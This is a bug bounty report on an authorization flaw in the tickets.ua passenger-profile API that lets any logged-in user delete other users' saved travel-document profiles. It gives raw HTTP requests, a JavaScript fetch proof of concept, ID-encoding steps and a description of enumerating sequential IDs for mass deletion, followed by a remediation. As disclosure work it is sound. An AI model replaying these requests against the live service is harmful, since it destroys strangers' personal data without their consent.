# W-003 — IDOR: Delete Any User's Saved Passenger Profile (Tickets.ua)

**Program:** Tickets Travel Network (HackenProof)  
**Asset:** `my.tickets.ua`  
**Severity:** High — CVSS 3.1: `AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:L` = **7.1**  
**CWE:** CWE-639 (Authorization Bypass Through User-Controlled Key)  
**Testing date:** 2026-05-21

---

## TL;DR

The endpoint `POST /en/api/cabinet/delete-passenger` accepts passenger IDs from any authenticated user and deletes them without verifying ownership. Meanwhile, the read endpoint for the same resource correctly enforces ownership (HTTP error 9204 for cross-account reads). The asymmetry between the read and delete authorization checks is the bug. Passenger IDs are sequential integers — easily enumerable — and deletion is permanent.

---

## Discovery Process

### 1. Mapping the passenger management feature

Tickets.ua lets users save passenger profiles (name, date of birth, passport/ID number, citizenship) for quick booking. I found these endpoints by observing requests in the browser developer tools during the booking flow:

- `POST /en/api/cabinet/savedPassengers` — lists your saved passengers
- `POST /en/api/cabinet/passenger` — reads a specific passenger by ID
- `POST /en/api/cabinet/delete-passenger` — deletes a passenger by ID

### 2. Testing the read endpoint first

I set up two accounts (Account A = attacker, Account B = victim). I fetched Account B's passenger list and noted a passenger ID. Then I tried to read that passenger from Account A's session:

```
POST /en/api/cabinet/passenger
Cookie: [Account A session]
{"id": [VICTIM_PASSENGER_ID]}
```

Response: `{"error":{"code":"9204","message":"passenger not found"}}`

The read endpoint correctly rejected cross-account access.

### 3. Testing the delete endpoint

I sent the same passenger ID to the delete endpoint from Account A's session:

```
POST /en/api/cabinet/delete-passenger
Cookie: [Account A session]
{"id": "[BASE64_ENCODED_ID]"}
```

Response: `{"success":true,"result":true,"error":false}`

HTTP 200. The passenger was deleted.

### 4. Confirming from the victim's perspective

Listing Account B's passengers after the deletion returned an empty array. The record was permanently gone.

---

## Vulnerability

The delete endpoint performs no ownership check. Any authenticated user can delete any passenger ID they supply in the request body.

**The asymmetry is the smoking gun:** the read endpoint (`/cabinet/passenger`) returns error 9204 when you request another user's record. The delete endpoint (`/cabinet/delete-passenger`) has no equivalent check — the same ID that fails on read succeeds on delete.

**ID encoding:** Passenger IDs are integers wrapped in a JSON array and base64-encoded. For example, passenger ID `12345678` becomes `btoa('[12345678]')`. Encoding is predictable and reversible.

**ID enumeration:** IDs are sequential integers. Given any valid ID, adjacent IDs are valid with high probability. An attacker who discovers one ID (e.g., from their own account or from any disclosure elsewhere) can iterate over a range and batch-delete passengers across the platform.

---

## Steps to Reproduce

> Requires two registered accounts on my.tickets.ua. Account B must have at least one saved passenger.

**Step 1 — List victim's passengers (from Account B's session)**

```
POST /en/api/cabinet/savedPassengers HTTP/1.1
Host: my.tickets.ua
Cookie: [Account B session]
Content-Type: application/json

{"service":"avia"}
```

Response (example — fields and values are researcher test data):
```json
{"success":true,"result":[{
  "id": [PASSENGER_ID],
  "firstName": "[NAME]",
  "lastName": "[NAME]",
  "type": "adt",
  "gender": "M",
  "birthday": "DD.MM.YYYY",
  "documents": [{"citizenship":"UA","docType":{"code":"passport"}}]
}]}
```

**Step 2 — Encode the passenger ID**

```javascript
// Browser console or Node.js
const encodedId = btoa('[' + PASSENGER_ID + ']');
// Example: btoa('[12345678]') → "WzEyMzQ1Njc4XQ=="
```

**Step 3 — Delete from Account A's session (attacker)**

```
POST /en/api/cabinet/delete-passenger HTTP/1.1
Host: my.tickets.ua
Cookie: [Account A session]
Content-Type: application/json
X-API-VERSION: v1

{"id":"[BASE64_ENCODED_PASSENGER_ID]"}
```

Response: `{"success":true,"result":true,"error":false}`

**Step 4 — Verify deletion from Account B's session**

```
POST /en/api/cabinet/savedPassengers HTTP/1.1
Host: my.tickets.ua
Cookie: [Account B session]
Content-Type: application/json

{"service":"avia"}
```

Response: `{"success":true,"result":[],"error":false}` — passenger permanently deleted.

**JavaScript PoC (single request from attacker's browser session):**

```javascript
const targetId = PASSENGER_ID;
const encodedId = btoa('[' + targetId + ']');

fetch('/en/api/cabinet/delete-passenger', {
  method: 'POST',
  credentials: 'include',
  headers: {
    'Content-Type': 'application/json',
    'X-API-VERSION': 'v1'
  },
  body: JSON.stringify({ id: encodedId })
}).then(r => r.json()).then(console.log);
// → {"success":true,"result":true,"error":false}
```

---

## Impact

1. **Any authenticated user can permanently delete any other user's saved passenger profiles.** Profiles contain personal travel document data (name, date of birth, passport number, citizenship, document expiry).

2. **Mass enumeration and batch deletion is trivial:** IDs are sequential integers. Starting from any known ID, an attacker can iterate over a range and silently delete thousands of passenger profiles across the platform with no rate limiting observed.

3. **Disrupts future bookings:** Saved passengers allow quick booking without re-entering travel documents. Mass deletion forces all affected users to manually re-enter their documents, causing failed or abandoned bookings.

4. **Irreversible:** Deletion is permanent with no recovery mechanism apparent from the API.

---

## Remediation

Before processing deletion, verify the passenger record belongs to the authenticated user:

```sql
SELECT id FROM passengers WHERE id = :id AND user_id = :current_user_id
```

If no record is found (or it belongs to a different user), return the same error 9204 already implemented in the read endpoint.

The fix pattern already exists in the codebase — it just needs to be applied consistently across write operations.

---

## Lessons Learned

- **Read/write asymmetry in access control is a common pattern.** When you find a correctly protected read endpoint, immediately test the corresponding write and delete endpoints. The authorization check is often added to one but not the other.
- **Sequential integer IDs + missing ownership check = mass-impact IDOR.** The combination matters: an opaque GUID with a missing check would be much harder to exploit at scale.
- **Base64 encoding is not protection.** The encoding (`btoa('[id]')`) creates the illusion of obfuscation but provides none — it's trivially reversible.
- **Always test the full CRUD surface.** Many IDOR reports focus on read (data disclosure). Delete IDORs often have higher impact (irreversible destruction) and lower fix attention.
- **Confirming deletion from the victim's session** is the read-back that makes the PoC complete. A 200 response from the attacker alone is not enough — you need to show the state actually changed for the victim.
